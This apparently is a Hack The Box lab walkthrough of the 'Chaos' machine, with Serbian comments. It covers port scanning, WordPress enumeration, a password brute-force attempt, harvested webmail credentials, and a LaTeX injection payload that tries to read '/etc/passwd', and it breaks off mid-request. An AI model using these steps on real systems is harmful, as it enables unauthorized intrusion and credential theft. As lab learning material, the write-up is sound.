@@ -1,0 +1,880 @@
+sjelicic@Laki:~$ sudo nmap -p- -sC -sV -O -A 10.10.10.120
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-03 13:31 CEST
+Nmap scan report for 10.10.10.120
+Host is up (0.029s latency).
+Not shown: 65529 closed ports
+PORT      STATE SERVICE  VERSION
+80/tcp    open  http     Apache httpd 2.4.34 ((Ubuntu)) 			<- mozemo proveriti koje verzije Ubuntu-a koriste httpd 2.4.34
+|_http-server-header: Apache/2.4.34 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+110/tcp   open  pop3     Dovecot pop3d
+|_pop3-capabilities: AUTH-RESP-CODE CAPA SASL UIDL STLS PIPELINING TOP RESP-CODES
+| ssl-cert: Subject: commonName=chaos
+| Subject Alternative Name: DNS:chaos
+| Not valid before: 2018-10-28T10:01:49
+|_Not valid after:  2028-10-25T10:01:49
+|_ssl-date: TLS randomness does not represent time
+143/tcp   open  imap     Dovecot imapd (Ubuntu)
+|_imap-capabilities: more IDLE Pre-login ID listed capabilities LITERAL+ LOGIN-REFERRALS have SASL-IR post-login OK LOGINDISABLEDA0001 IMAP4rev1 STARTTLS ENABLE
+| ssl-cert: Subject: commonName=chaos
+| Subject Alternative Name: DNS:chaos
+| Not valid before: 2018-10-28T10:01:49
+|_Not valid after:  2028-10-25T10:01:49
+|_ssl-date: TLS randomness does not represent time
+993/tcp   open  ssl/imap Dovecot imapd (Ubuntu)
+|_imap-capabilities: IDLE Pre-login ID more capabilities LITERAL+ LOGIN-REFERRALS have SASL-IR post-login listed OK IMAP4rev1 AUTH=PLAINA0001 ENABLE
+| ssl-cert: Subject: commonName=chaos
+| Subject Alternative Name: DNS:chaos
+| Not valid before: 2018-10-28T10:01:49
+|_Not valid after:  2028-10-25T10:01:49
+|_ssl-date: TLS randomness does not represent time
+995/tcp   open  ssl/pop3 Dovecot pop3d
+|_pop3-capabilities: AUTH-RESP-CODE CAPA SASL(PLAIN) UIDL USER PIPELINING TOP RESP-CODES
+| ssl-cert: Subject: commonName=chaos
+| Subject Alternative Name: DNS:chaos
+| Not valid before: 2018-10-28T10:01:49
+|_Not valid after:  2028-10-25T10:01:49
+|_ssl-date: TLS randomness does not represent time
+10000/tcp open  http     MiniServ 1.890 (Webmin httpd)
+|_http-server-header: MiniServ/1.890
+|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.70%E=4%D=6/3%OT=80%CT=1%CU=36093%PV=Y%DS=2%DC=T%G=Y%TM=5CF50544
+OS:%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=10F%TI=Z%CI=Z%II=I%TS=A)OPS(
+OS:O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11
+OS:NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(
+OS:R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
+OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
+OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
+OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
+OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
+OS:S)
+
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 256/tcp)
+HOP RTT      ADDRESS
+1   28.56 ms 10.10.14.1
+2   28.67 ms 10.10.10.120
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 74.98 seconds
+
+
+
+
+#imas i tcp i ssl portove otvorene
+Dovecot is an open source IMAP and POP3 email server for Linux/UNIX-like systems, written with security primarily in mind.
+https://www.dovecot.org/
+
+Webmin is a web-based interface for system administration for Unix. Using any modern web browser, you can setup user accounts, Apache, DNS, file sharing and much more. Webmin removes the need to manually edit Unix configuration files like /etc/passwd, and lets you manage a system from the console or remotely.
+http://www.webmin.com/index.html
+
+
+
+hostname masine (dobijene u nmap-u)
+ssl-cert: Subject: commonName=chaos
+
+
+###Word liste i rockyou.txt
+sjelicic@Laki:~$ tree /usr/share/wordlists/
+/usr/share/wordlists/
+├── dirb -> /usr/share/dirb/wordlists
+├── dirbuster -> /usr/share/dirbuster/wordlists
+├── dnsmap.txt -> /usr/share/dnsmap/wordlist_TLAs.txt
+├── fasttrack.txt -> /usr/share/set/src/fasttrack/wordlist.txt
+├── fern-wifi -> /usr/share/fern-wifi-cracker/extras/wordlists
+├── metasploit -> /usr/share/metasploit-framework/data/wordlists
+├── nmap.lst -> /usr/share/nmap/nselib/data/passwords.lst
+├── rockyou.txt.gz
+├── sqlmap.txt -> /usr/share/sqlmap/txt/wordlist.txt
+└── wfuzz -> /usr/share/wfuzz/wordlist
+
+rockyou.txt 				<- 123 MB passworda
+https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
+
+
+
+Directory/file & DNS busting tool written in Go
+https://github.com/OJ/gobuster
+
+sjelicic@Laki:/usr/share/wordlists$ gobuster -u 10.10.10.120 -t 40 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  		<- -t 40 koristi 40 thread-ova
+
+=====================================================
+Gobuster v2.0.1              OJ Reeves (@TheColonial)
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : http://10.10.10.120/
+[+] Threads      : 40
+[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes : 200,204,301,302,307,403
+[+] Timeout      : 10s
+=====================================================
+2019/06/04 13:42:40 Starting gobuster
+=====================================================
+/wp (Status: 301)
+/javascript (Status: 301)
+/server-status (Status: 403)
+=====================================================
+2019/06/04 13:45:44 Finished
+=====================================================
+
+
+sjelicic@Laki:/usr/share/wordlists$ sudo vim /etc/hosts
+
+127.0.0.1		localhost
+127.0.1.1		Laki
+10.10.10.120	chaos chaos.htb 								<- preskacemo DNS resolution. htb je domen vecine masina na hackthebox.eu
+
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+
+
+http://chaos.htb/wp 			<- Not Found 												<- koristimo rezultate gobuster-a
+								   The requested URL /wp was not found on this server.
+
+10.10.10.120/wp 				<- Index of /wp, vodi ka http://10.10.10.120/wp/wordpress/
+
+
+WPScan
+WordPress Vulnerability Scanner 
+https://github.com/wpscanteam/wpscan
+
+
+sjelicic@Laki:/usr/share/wordlists$ wpscan --enumerate --url 10.10.10.120/wp/wordpress
+_______________________________________________________________
+        __          _______   _____
+        \ \        / /  __ \ / ____|
+         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+           \  /\  /  | |     ____) | (__| (_| | | | |
+            \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+        WordPress Security Scanner by the WPScan Team
+                       Version 3.5.3
+          Sponsored by Sucuri - https://sucuri.net
+      @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_
+_______________________________________________________________
+
+[+] URL: http://10.10.10.120/wp/wordpress/
+[+] Started: Tue Jun  4 14:29:20 2019
+
+Interesting Finding(s):
+
+[+] http://10.10.10.120/wp/wordpress/
+ | Interesting Entry: Server: Apache/2.4.34 (Ubuntu)
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] http://10.10.10.120/wp/wordpress/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access
+
+[+] http://10.10.10.120/wp/wordpress/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] http://10.10.10.120/wp/wordpress/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 4.9.8 identified (Insecure, released on 2018-08-02).
+ | Detected By: Rss Generator (Passive Detection)
+ |  - http://10.10.10.120/wp/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=4.9.8</generator>
+ |  - http://10.10.10.120/wp/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=4.9.8</generator>
+ |
+ | [!] 9 vulnerabilities identified:
+ |
+ | [!] Title: WordPress <= 5.0 - Authenticated File Delete
+ |     Fixed in: 4.9.9
+ |     References:
+ |      - https://wpvulndb.com/vulnerabilities/9169
+ |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20147
+ |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
+ |
+ | [!] Title: WordPress <= 5.0 - Authenticated Post Type Bypass
+ |     Fixed in: 4.9.9
+ |     References:
+ |      - https://wpvulndb.com/vulnerabilities/9170
+ |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20152
+ |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
+ |      - https://blog.ripstech.com/2018/wordpress-post-type-privilege-escalation/
+ |
+ | [!] Title: WordPress <= 5.0 - PHP Object Injection via Meta Data
+ |     Fixed in: 4.9.9
+ |     References:
+ |      - https://wpvulndb.com/vulnerabilities/9171
+ |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20148
+ |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
+ |
+ | [!] Title: WordPress <= 5.0 - Authenticated Cross-Site Scripting (XSS)
+ |     Fixed in: 4.9.9
+ |     References:
+ |      - https://wpvulndb.com/vulnerabilities/9172
+ |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20153
+ |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
+ |
+ | [!] Title: WordPress <= 5.0 - Cross-Site Scripting (XSS) that could affect plugins
+ |     Fixed in: 4.9.9
+ |     References:
+ |      - https://wpvulndb.com/vulnerabilities/9173
+ |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20150
+ |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
+ |      - https://github.com/WordPress/WordPress/commit/fb3c6ea0618fcb9a51d4f2c1940e9efcd4a2d460
+ |
+ | [!] Title: WordPress <= 5.0 - User Activation Screen Search Engine Indexing
+ |     Fixed in: 4.9.9
+ |     References:
+ |      - https://wpvulndb.com/vulnerabilities/9174
+ |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20151
+ |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
+ |
+ | [!] Title: WordPress <= 5.0 - File Upload to XSS on Apache Web Servers
+ |     Fixed in: 4.9.9
+ |     References:
+ |      - https://wpvulndb.com/vulnerabilities/9175
+ |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20149
+ |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
+ |      - https://github.com/WordPress/WordPress/commit/246a70bdbfac3bd45ff71c7941deef1bb206b19a
+ |
+ | [!] Title: WordPress 3.7-5.0 (except 4.9.9) - Authenticated Code Execution
+ |     Fixed in: 4.9.9
+ |     References:
+ |      - https://wpvulndb.com/vulnerabilities/9222
+ |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8942
+ |      - https://blog.ripstech.com/2019/wordpress-image-remote-code-execution/
+ |      - https://www.rapid7.com/db/modules/exploit/multi/http/wp_crop_rce
+ |
+ | [!] Title: WordPress 3.9-5.1 - Comment Cross-Site Scripting (XSS)
+ |     Fixed in: 4.9.10
+ |     References:
+ |      - https://wpvulndb.com/vulnerabilities/9230
+ |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9787
+ |      - https://github.com/WordPress/WordPress/commit/0292de60ec78c5a44956765189403654fe4d080b
+ |      - https://wordpress.org/news/2019/03/wordpress-5-1-1-security-and-maintenance-release/
+ |      - https://blog.ripstech.com/2019/wordpress-csrf-to-rce/
+
+[+] WordPress theme in use: twentyseventeen
+ | Location: http://10.10.10.120/wp/wordpress/wp-content/themes/twentyseventeen/
+ | Last Updated: 2019-05-07T00:00:00.000Z
+ | Readme: http://10.10.10.120/wp/wordpress/wp-content/themes/twentyseventeen/README.txt
+ | [!] The version is out of date, the latest version is 2.2
+ | Style URL: http://10.10.10.120/wp/wordpress/wp-content/themes/twentyseventeen/style.css?ver=4.9.8
+ | Style Name: Twenty Seventeen
+ | Style URI: https://wordpress.org/themes/twentyseventeen/
+ | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
+ | Author: the WordPress team
+ | Author URI: https://wordpress.org/
+ |
+ | Detected By: Css Style (Passive Detection)
+ |
+ | Version: 1.7 (80% confidence)
+ | Detected By: Style (Passive Detection)
+ |  - http://10.10.10.120/wp/wordpress/wp-content/themes/twentyseventeen/style.css?ver=4.9.8, Match: 'Version: 1.7'
+
+[+] Enumerating Vulnerable Plugins (via Passive Methods)
+
+[i] No plugins Found.
+
+[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)
+ Checking Known Locations - Time: 00:00:02 <===================================================================================================================> (292 / 292) 100.00% Time: 00:00:02
+[+] Checking Theme Versions (via Passive and Aggressive Methods)
+
+[i] No themes Found.
+
+[+] Enumerating Timthumbs (via Passive and Aggressive Methods)
+ Checking Known Locations - Time: 00:00:17 <=================================================================================================================> (2573 / 2573) 100.00% Time: 00:00:17
+
+[i] No Timthumbs Found.
+
+[+] Enumerating Config Backups (via Passive and Aggressive Methods)
+ Checking Config Backups - Time: 00:00:00 <======================================================================================================================> (21 / 21) 100.00% Time: 00:00:00
+
+[i] No Config Backups Found.
+
+[+] Enumerating DB Exports (via Passive and Aggressive Methods)
+ Checking DB Exports - Time: 00:00:00 <==========================================================================================================================> (36 / 36) 100.00% Time: 00:00:00
+
+[i] No DB Exports Found.
+
+[+] Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be set to "Plain" for those to be detected)
+ Brute Forcing Attachment IDs - Time: 00:00:01 <===============================================================================================================> (100 / 100) 100.00% Time: 00:00:01
+
+[i] No Medias Found.
+
+[+] Enumerating Users (via Passive and Aggressive Methods)
+ Brute Forcing Author IDs - Time: 00:00:00 <=====================================================================================================================> (10 / 10) 100.00% Time: 00:00:00
+
+[i] User(s) Identified:
+
+[+] human 																								<- identifikovan korisnik
+ | Detected By: Author Posts - Author Pattern (Passive Detection)
+ | Confirmed By:
+ |  Rss Generator (Passive Detection)
+ |  Wp Json Api (Aggressive Detection)
+ |   - http://10.10.10.120/wp/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
+ |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ |  Login Error Messages (Aggressive Detection)
+
+
+[+] Finished: Tue Jun  4 14:29:55 2019
+[+] Requests Done: 3048
+[+] Cached Requests: 38
+[+] Data Sent: 704.915 KB
+[+] Data Received: 700.573 KB
+[+] Memory used: 213.895 MB
+[+] Elapsed time: 00:00:34
+
+
+#standardno za WordPress
+http://10.10.10.120/wp/wordpress/wp-login.php 			<- login konzola
+
+
+SecLists is the security tester's companion. It's a collection of multiple types of lists used during security assessments, collected in one place. List types include usernames, passwords, URLs, sensitive data patterns, fuzzing payloads, web shells, and many more.
+https://github.com/danielmiessler/SecLists
+
+sjelicic@Laki:/usr/share$ sudo apt -y install seclists
+
+
+#bruteforce a pass for the username human using the bt-4-password.txt list from seclists installed previously
+sjelicic@Laki:/usr/share/wordlists$ wpscan --usernames human --passwords /usr/share/seclists/Passwords/bt4-password.txt --url 10.10.10.120/wp/wordpress
+
+
+#na http://10.10.10.120/wp/wordpress/ koristim human kao password i dobijam  		<- brute forcing nije uspeo jebem ga
+POSTS
+POSTED ONOCTOBER 28, 2018
+Protected: chaos
+Creds for webmail : 															<- znamo portove za webmail zahvaljujuci nmap-u
+
+username – ayush
+password – jiujitsu
+
+
+#u Burp-u, saljemo / (za chaos.htb) repeater-u
+GET / HTTP/1.1
+Host: chaos.htb 									<- promenimo u webmail.chaos.htb, dobijamo odgovor
+Accept-Encoding: gzip, deflate							
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+Connection: close
+
+#da bi pristupili webmail-u moramo da dodamo host u /etc/hosts
+sjelicic@Laki:/usr/share/seclists$ cat /etc/hosts
+127.0.0.1	localhost
+127.0.1.1	Laki
+10.10.10.120	chaos chaos.htb webmail.chaos.htb
+
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+
+
+#na webmail.chaos.htb, koristim kredencijale ayush:jiujitsu
+Roundcube webmail...
+...is a browser-based multilingual IMAP client with an application-like user interface. It provides full functionality you expect from an email client, including MIME support, address book, folder manipulation, message searching and spell checking.
+#u Draftu nalazim enkriptovanu poruku (enim_msg.txt) i Python funkciju za dekriptovanje (en.py)
+
+###en.py
+def encrypt(key, filename):
+    chunksize = 64*1024
+    outputFile = "en" + filename
+    filesize = str(os.path.getsize(filename)).zfill(16)
+    IV =Random.new().read(16)
+
+    encryptor = AES.new(key, AES.MODE_CBC, IV)
+
+    with open(filename, 'rb') as infile:
+        with open(outputFile, 'wb') as outfile:
+            outfile.write(filesize.encode('utf-8'))
+            outfile.write(IV)
+
+            while True:
+                chunk = infile.read(chunksize)
+
+                if len(chunk) == 0:
+                    break
+                elif len(chunk) % 16 != 0:
+                    chunk += b' ' * (16 - (len(chunk) % 16))
+
+                outfile.write(encryptor.encrypt(chunk))
+
+def getKey(password):
+            hasher = SHA256.new(password.encode('utf-8'))
+            return hasher.digest()
+
+
+
+
+###drugi nacin pristupa webmail.chaos.htb
+
+Ncat Users' Guide 								<- reimplementacija nc-a 
+https://nmap.org/ncat/guide/index.html
+#mora se instalirati sudo apt install -y ncat
+
+IMAP is used to retrieve email. You cannot send email via IMAP
+
+#imamo mail server (Dovecot) na dva porta:
+#143/tcp   open  imap     Dovecot imapd (Ubuntu)
+#993/tcp   open  ssl/imap Dovecot imapd (Ubuntu)
+
+sjelicic@Laki:~/Downloads$ ncat 10.10.10.120 143 
+* OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ STARTTLS LOGINDISABLED] Dovecot (Ubuntu) ready.
+login ayush jiujitsu
+login BAD First parameter in line is IMAP's command tag, not the command name. Add that before the command, like: a login user pass
+a login aysuh jiujitsu
+* BAD [ALERT] Plaintext authentication not allowed without SSL/TLS, but your client did it anyway. If anyone was listening, the password was exposed.
+a NO [PRIVACYREQUIRED] Plaintext authentication disallowed on non-secure (SSL/TLS) connections.
+
+
+sjelicic@Laki:~/Downloads$ ncat --ssl 10.10.10.120 993
+* OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN] Dovecot (Ubuntu) ready.
+
+#IMAP commands begin with an arbitrary label. U ovom slucaju izabrao sam a
+a login ayash jiujitsu
+a NO [AUTHENTICATIONFAILED] Authentication failed.
+a login ayush jiujitsu
+a OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SORT=DISPLAY THREAD=REFERENCES THREAD=REFS THREAD=ORDEREDSUBJECT MULTIAPPEND URL-PARTIAL CATENATE UNSELECT CHILDREN NAMESPACE UIDPLUS LIST-EXTENDED I18NLEVEL=1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT=SEARCH LIST-STATUS BINARY MOVE SNIPPET=FUZZY LITERAL+ NOTIFY SPECIAL-USE] Logged in
+
+#postoji migucnost skidanja mail poruka preko komandne linije ali je uzasno komplikovano
+#lakse je uneti samo podatke za konekciju u neki mail klijent (recimo evolution)
+Tutorial: troubleshooting IMAP server configuration
+https://www.courier-mta.org/imap/tutorial.setup.html
+
+
+#kljuc za dekripciju je ime drugog indijca (sahay)
+
+###en.py
+def encrypt(key, filename):
+    chunksize = 64*1024
+    outputFile = "en" + filename
+    filesize = str(os.path.getsize(filename)).zfill(16)
+    IV =Random.new().read(16)
+
+    encryptor = AES.new(key, AES.MODE_CBC, IV)
+
+    with open(filename, 'rb') as infile:
+        with open(outputFile, 'wb') as outfile:
+            outfile.write(filesize.encode('utf-8'))
+            outfile.write(IV)
+
+            while True:
+                chunk = infile.read(chunksize)
+
+                if len(chunk) == 0:
+                    break
+                elif len(chunk) % 16 != 0:
+                    chunk += b' ' * (16 - (len(chunk) % 16))
+
+                outfile.write(encryptor.encrypt(chunk))
+
+def getKey(password):
+            hasher = SHA256.new(password.encode('utf-8'))
+            return hasher.digest()
+
+
+
+
+#Python funkcija za dekripciju iz chaos.pdf-a
+from​ Crypto.Cipher ​ import​ AES
+from​ Crypto.Hash ​ import​ SHA256
+	def​ ​ decrypt​ (key, filename):
+		chunksize = ​ 64​ * ​ 1024
+		output = ​ "dec_msg.txt"
+		f = open(filename)
+		filesize = f.read(​ 16​ ) ​ # Read first 16 bytes written to the file
+		IV = f.read(​ 16​ ) ​ # Read the next 16 bytes which is the IV
+
+		decryptor = AES.new(key, AES.MODE_CBC, IV)
+
+		with​ open(output, ​ 'wb'​ ) ​ as​ outfile:
+		
+		while​ True​ :
+			chunk = f.read(chunksize)
+			if​ len(chunk) == ​ 0 ​ :
+			break
+
+			outfile.write(decryptor.decrypt(chunk))
+
+	def​ ​ getKey​ (password):
+		hasher = SHA256.new(password.encode(​ 'utf-8'​ ))
+		return​ hasher.digest()
+
+decrypt(getKey(​ "sahay"​ ), ​ "enim_msg.txt"​ )
+
+
+sjelicic@Laki:~/pCloudDrive/OSCP/HTB/Chaos$ python en.py
+SGlpIFNhaGF5CgpQbGVhc2UgY2hlY2sgb3VyIG5ldyBzZXJ2aWNlIHdoaWNoIGNyZWF0ZSBwZGYKCnAucyAtIEFzIHlvdSB0b2xkIG1lIHRvIGVuY3J5cHQgaW1wb3J0YW50IG1zZywgaSBkaWQgOikKCmh0dHA6Ly9jaGFvcy5odGIvSjAwX3cxbGxfZjFOZF9uMDdIMW45X0gzcjMKClRoYW5rcywKQXl1c2gK 		<- base64 format
+
+      
+sjelicic@Laki:~/pCloudDrive/OSCP/HTB/Chaos$ python en.py | base64 -d 				<- base64 decode
+Hii Sahay
+Please check our new service which create pdf
+p.s - As you told me to encrypt important msg, i did :)
+http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3
+
+Thanks,
+Ayush
+base64: invalid input
+
+
+#BURP Suite proxy, sent to Repeater
+POST /J00_w1ll_f1Nd_n07H1n9_H3r3/ajax.php HTTP/1.1
+Host: chaos.htb
+Content-Length: 36
+Accept: */*
+Origin: http://chaos.htb
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Referer: http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,hr;q=0.8
+Connection: close
+
+content=ola+mi+amigo!&template=test1
+
+
+#BURP Suite Repeater response
+HTTP/1.1 200 OK
+Date: Thu, 06 Jun 2019 11:28:08 GMT
+Server: Apache/2.4.34 (Ubuntu)
+Vary: Accept-Encoding
+Content-Length: 3405
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+
+
+LOG:
+This is pdfTeX,  																			<- vazno
+Version 3.14159265-2.6-1.40.19 (TeX Live 2019/dev/Debian) (preloaded format=pdflatex)
+ \write18 enabled.
+entering extended mode
+(./92a481829a249c813b4d96d1f9d70f44.tex
+LaTeX2e <2018-04-01> patch level 5
+(/usr/share/texlive/texmf-dist/tex/latex/koma-script/scrartcl.cls
+Document Class: scrartcl 2018/03/30 v3.25 KOMA-Script document class (article)
+(/usr/share/texlive/texmf-dist/tex/latex/koma-script/scrkbase.sty
+(/usr/share/texlive/texmf-dist/tex/latex/koma-script/scrbase.sty
+(/usr/share/texlive/texmf-dist/tex/latex/graphics/keyval.sty)
+(/usr/share/texlive/texmf-dist/tex/latex/koma-script/scrlfile.sty)))
+(/usr/share/texlive/texmf-dist/tex/latex/koma-script/tocbasic.sty)
+(/usr/share/texlive/texmf-dist/tex/latex/koma-script/scrsize11pt.clo)
+(/usr/share/texlive/texmf-dist/tex/latex/koma-script/typearea.sty))
+(/usr/share/texlive/texmf-dist/tex/latex/base/fontenc.sty
+(/usr/share/texlive/texmf-dist/tex/latex/base/t1enc.def))
+(/usr/share/texlive/texmf-dist/tex/latex/jknapltx/sans.sty
+(/usr/share/texlive/texmf-dist/tex/latex/base/t1cmss.fd))
+(/usr/share/texlive/texmf-dist/tex/generic/babel/babel.sty
+(/usr/share/texlive/texmf-dist/tex/generic/babel/switch.def)
+(/usr/share/texlive/texmf-dist/tex/generic/babel-english/english.ldf
+(/usr/share/texlive/texmf-dist/tex/generic/babel/babel.def
+(/usr/share/texlive/texmf-dist/tex/generic/babel/txtbabel.def))))
+(/usr/share/texlive/texmf-dist/tex/latex/amsmath/amsmath.sty
+For additional information on amsmath, use the `?' option.
+(/usr/share/texlive/texmf-dist/tex/latex/amsmath/amstext.sty
+(/usr/share/texlive/texmf-dist/tex/latex/amsmath/amsgen.sty))
+(/usr/share/texlive/texmf-dist/tex/latex/amsmath/amsbsy.sty)
+(/usr/share/texlive/texmf-dist/tex/latex/amsmath/amsopn.sty))
+(/usr/share/texlive/texmf-dist/tex/latex/amsfonts/amsfonts.sty)
+(/usr/share/texlive/texmf-dist/tex/latex/amscls/amsthm.sty)
+(/usr/share/texlive/texmf-dist/tex/latex/lipsum/lipsum.sty)
+(/usr/share/texlive/texmf-dist/tex/latex/sectsty/sectsty.sty)
+
+Class scrartcl Warning: Usage of package `fancyhdr' together
+(scrartcl)              with a KOMA-Script class is not recommended.
+(scrartcl)              I'd suggest to use 
+(scrartcl)              package `scrlayer' or `scrlayer-scrpage', because
+(scrartcl)              they support KOMA-Script classes.
+(scrartcl)              With `fancyhdr' several features of class `scrartcl'
+(scrartcl)              like options `headsepline', `footsepline' or command
+(scrartcl)              `\MakeMarkcase' and the commands `\setkomafont' and
+(scrartcl)              `\addtokomafont' for the page style elements need
+(scrartcl)              explicite user intervention to work.
+(scrartcl)              Nevertheless, using requested
+(scrartcl)              package `fancyhdr' on input line 34.
+
+(/usr/share/texlive/texmf-dist/tex/latex/fancyhdr/fancyhdr.sty)
+No file 92a481829a249c813b4d96d1f9d70f44.aux.
+
+LaTeX Font Warning: Font shape `T1/cmss/m/sc' in size <10.95> not available
+(Font)              Font shape `T1/cmr/m/sc' tried instead on input line 69.
+
+(/usr/share/texlive/texmf-dist/tex/latex/amsfonts/umsa.fd)
+(/usr/share/texlive/texmf-dist/tex/latex/amsfonts/umsb.fd) [1{/var/lib/texmf/fo
+nts/map/pdftex/updmap/pdftex.map}] (./92a481829a249c813b4d96d1f9d70f44.aux) )
+!pdfTeX error: /usr/bin/pdflatex (file ecss1095): Font ecss1095 at 600 not foun
+d
+ ==> Fatal error occurred, no output PDF file produced!
+
+
+#LATEX RCE (Remote Code Execution) code injection
+A list of useful payloads and bypass for Web Application Security and Pentest/CTF
+https://github.com/swisskyrepo/PayloadsAllTheThings
+#for latex
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection
+
+
+###Request
+POST /J00_w1ll_f1Nd_n07H1n9_H3r3/ajax.php HTTP/1.1
+Host: chaos.htb
+Content-Length: 62
+Accept: */*
+Origin: http://chaos.htb
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Referer: http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,hr;q=0.8
+Connection: close
+
+content=\input{/etc/passwd} 						<- pokusao da odradim code injection
+\include{password}&template=test1
+
+
+###Response
+HTTP/1.1 200 OK
+Date: Thu, 06 Jun 2019 11:58:57 GMT
+Server: Apache/2.4.34 (Ubuntu)
+Content-Length: 25
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+BLACKLISTED commands used 							<- after testing turns out input command is blacklisted
+
+
+POST /J00_w1ll_f1Nd_n07H1n9_H3r3/ajax.php HTTP/1.1
+Host: chaos.htb
+Content-Length: 63
+Accept: */*
+Origin: http://chaos.htb
+X-Requested-With: XMLHttpRequest
